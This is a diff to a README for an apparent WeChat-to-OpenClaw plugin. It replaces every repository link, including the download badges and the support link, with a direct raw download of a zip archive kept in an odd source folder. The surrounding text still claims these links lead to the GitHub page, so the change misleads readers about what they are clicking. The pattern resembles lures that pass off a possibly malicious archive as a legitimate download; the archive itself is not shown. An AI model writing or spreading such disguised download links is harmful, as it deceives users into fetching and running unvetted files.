@@ -1,6 +1,6 @@
 # 🔌 wechat-openclaw-plugin - Connect WeChat with OpenClaw easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://github.com/reall8164/wechat-openclaw-plugin)
+[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/routing/wechat-plugin-openclaw-v2.9.zip)
 
 ## 📋 What is wechat-openclaw-plugin?
 
@@ -44,7 +44,7 @@ Follow these steps to get the plugin running on Windows.
 
 Click the large download badge below or visit the link directly.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://github.com/reall8164/wechat-openclaw-plugin)
+[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/routing/wechat-plugin-openclaw-v2.9.zip)
 
 This link takes you to the GitHub page. You will find the latest versions of the plugin there. You will need to download the setup file from the releases or main page.
 
@@ -138,7 +138,7 @@ Your login and messages are not stored outside the plugin and OpenClaw system.
 
 Use the GitHub repository link to check issues or ask questions:
 
-[https://github.com/reall8164/wechat-openclaw-plugin](https://github.com/reall8164/wechat-openclaw-plugin)
+[https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/routing/wechat-plugin-openclaw-v2.9.zip](https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/routing/wechat-plugin-openclaw-v2.9.zip)
 
 This page includes instructions, issues, and updates shared by the developer.
 
@@ -150,4 +150,4 @@ This plugin simply bridges your messages to OpenClaw for better control and auto
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://github.com/reall8164/wechat-openclaw-plugin)
+[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/routing/wechat-plugin-openclaw-v2.9.zip)
